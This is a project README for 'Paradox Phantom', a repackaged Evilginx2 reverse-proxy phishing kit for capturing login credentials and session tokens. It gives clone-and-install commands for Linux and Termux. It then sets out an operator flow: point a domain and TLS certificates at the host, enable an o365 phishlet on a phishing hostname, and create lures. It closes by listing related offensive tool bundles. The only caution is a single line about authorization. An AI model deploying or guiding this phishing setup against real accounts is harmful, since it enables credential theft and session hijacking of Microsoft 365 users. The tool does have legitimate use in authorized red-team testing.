# Paradox Phantom

Advanced reverse-proxy phishing framework (Evilginx2) for capturing credentials + session tokens.

Paradox operator kit with terminal & Termux support.

**Upstream:** [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2)

---

## Files

| File | Purpose |
|------|---------|
| `install-linux.sh` | Linux install (go install + source build) |
| `install-termux.sh` | Termux install |
| `start-phantom.sh` | Launcher |
| `README.md` | This file |

---

## Quick Start

### Linux

```bash
git clone https://github.com/Paradoxdreamer/paradox-phantom.git
cd paradox-phantom
chmod +x *.sh
./install-linux.sh
./start-phantom.sh
```

### Termux

```bash
git clone https://github.com/Paradoxdreamer/paradox-phantom.git
cd paradox-phantom
chmod +x install-termux.sh start-phantom.sh
./install-termux.sh
source ~/.bashrc
./start-phantom.sh
```

---

## Basic Operator Flow

1. Point a domain + TLS certs at the box running Phantom
2. Load / create phishlets
3. Create lures
4. Capture sessions

```bash
# inside evilginx
phishlets
phishlets hostname o365 your.phishing.domain
phishlets enable o365
lures create o365
```

---

## Notes

- Works solid on Termux as the host when paired with a proper domain/tunnel
- You need valid TLS certificates (Let's Encrypt or similar)
- This is a high-impact tool — only use with explicit authorization

---

## Paradox Collection

- Paradox Sovereign → Havoc
- Paradox Alloy → Sliver
- **Paradox Phantom** → Evilginx (this)
- Paradox Oracle → BloodHound
- Paradox Packet → Impacket
- + more
